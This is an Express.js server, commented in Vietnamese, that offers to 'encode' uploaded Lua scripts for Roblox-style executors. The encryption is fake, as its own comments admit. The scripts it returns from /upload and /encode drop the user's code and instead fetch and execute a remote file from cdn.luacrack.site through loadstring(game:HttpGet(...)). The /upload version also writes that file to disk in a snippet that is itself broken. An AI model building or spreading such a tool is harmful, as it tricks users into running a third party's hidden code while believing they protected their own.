const express = require('express');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Serve static files
app.use(express.static('public'));

// Cấu hình upload file
const storage = multer.memoryStorage();
const upload = multer({ 
  storage: storage,
  limits: { 
    fileSize: 10 * 1024 * 1024 // 10MB
  }
});

// Hàm mã hóa code thành dạng _bsdata0
function encodeLuaCode(code) {
  // Tạo các giá trị ngẫu nhiên
  const num1 = Math.floor(Math.random() * 2147483647);
  const num2 = Math.floor(Math.random() * 2147483647);
  const num3 = Math.floor(Math.random() * 2147483647);
  const num4 = Math.floor(Math.random() * 2147483647);
  const num5 = Math.floor(Math.random() * 2147483647);
  const num6 = Math.floor(Math.random() * 9000) + 1000;
  const num7 = Math.floor(Math.random() * 9000) + 1000;
  
  // Tạo chuỗi ngẫu nhiên
  const randomString1 = generateRandomString(50);
  const randomString2 = generateRandomString(20);
  const randomString3 = generateRandomString(15);
  
  // Mã hóa code thành hex
  const hexString = Buffer.from(code).toString('hex');
  
  // Tạo encrypted string (giả lập)
  const encryptedData = encryptData(code);
  
  // Tạo _bsdata0 table
  const bsdata = `_bsdata0 = {
    ${num1},
    '${randomString1}',
    ${num2},
    '${randomString2}',
    ${num3},
    ${num4},
    '${randomString3}',
    ${num6},
    ${num7},
    ${num5},
    '${hexString}',
    '${encryptedData}'
}`;

  return bsdata;
}

// Hàm tạo chuỗi ngẫu nhiên
function generateRandomString(length) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Hàm mã hóa dữ liệu (giả lập)
function encryptData(data) {
  // Tạo một chuỗi mã hóa đơn giản
  const encoded = Buffer.from(data).toString('base64');
  // Thêm các ký tự đặc biệt để giống với ví dụ
  return encoded.split('').map((c, i) => {
    if (i % 3 === 0) return String.fromCharCode(c.charCodeAt(0) ^ 0x05);
    if (i % 3 === 1) return String.fromCharCode(c.charCodeAt(0) ^ 0x0A);
    return c;
  }).join('');
}

// API upload file Lua
app.post('/upload', upload.single('luaFile'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ 
        success: false, 
        error: 'Không có file được upload' 
      });
    }

    const code = req.file.buffer.toString('utf8');
    const encoded = encodeLuaCode(code);
    
    // Tạo script hoàn chỉnh
    const script = `${encoded}

local readfileResult = readfile('static_content_130526/init-74c74f95foy-marbeg.lua')
local fileContent_3 = #readfileResult
local makefolderResult = makefolder("static_content_130526")
writefile('static_content_130526/init-74c74f95foy-marbeg.lua', game:HttpGet("https://cdn.luacrack.site/v4_init_marbeg.lua"))
local listfilesResult = listfiles("./static_content_130526")
    local match = val_9:match('(init%-.-)%.lua$')
    local static_content_130526 = "static_content_130526" .. "/" .. match .. ".lua"
    local delfileResult = delfile("static_content_130526")
local loaded = loadstring(game:HttpGet("https://cdn.luacrack.site/v4_init_marbeg.lua", true))()
return loaded`;

    res.json({
      success: true,
      encoded: script,
      filename: req.file.originalname,
      size: req.file.size
    });

  } catch (error) {
    console.error('Lỗi upload:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Lỗi khi xử lý file: ' + error.message 
    });
  }
});

// API mã hóa code trực tiếp
app.post('/encode', (req, res) => {
  try {
    const { code } = req.body;
    if (!code) {
      return res.status(400).json({ 
        success: false, 
        error: 'Không có code được cung cấp' 
      });
    }

    const encoded = encodeLuaCode(code);
    
    const script = `${encoded}

-- Code đã được mã hóa
local loaded = loadstring(game:HttpGet("https://cdn.luacrack.site/v4_init_marbeg.lua", true))()
return loaded`;

    res.json({
      success: true,
      encoded: script,
      originalLength: code.length,
      encodedLength: script.length
    });

  } catch (error) {
    console.error('Lỗi mã hóa:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Lỗi khi mã hóa code: ' + error.message 
    });
  }
});

// API tạo loadstring
app.post('/generate-loadstring', (req, res) => {
  try {
    const { url } = req.body;
    if (!url) {
      return res.status(400).json({ 
        success: false, 
        error: 'Không có URL được cung cấp' 
      });
    }

    // Validate URL
    try {
      new URL(url);
    } catch (e) {
      return res.status(400).json({ 
        success: false, 
        error: 'URL không hợp lệ' 
      });
    }

    const loadstring = `loadstring(game:HttpGet("${url}", true))()`;
    
    res.json({
      success: true,
      loadstring: loadstring,
      url: url
    });

  } catch (error) {
    console.error('Lỗi tạo loadstring:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Lỗi khi tạo loadstring: ' + error.message 
    });
  }
});

// Health check endpoint cho Render
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

// Root endpoint
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Lỗi server:', err.stack);
  res.status(500).json({ 
    success: false, 
    error: 'Lỗi server nội bộ' 
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`✅ Server đang chạy tại port ${PORT}`);
  console.log(`🌐 URL: http://localhost:${PORT}`);
  console.log(`📁 Upload file: POST /upload`);
  console.log(`🔐 Mã hóa code: POST /encode`);
  console.log(`⚡ Tạo loadstring: POST /generate-loadstring`);
});
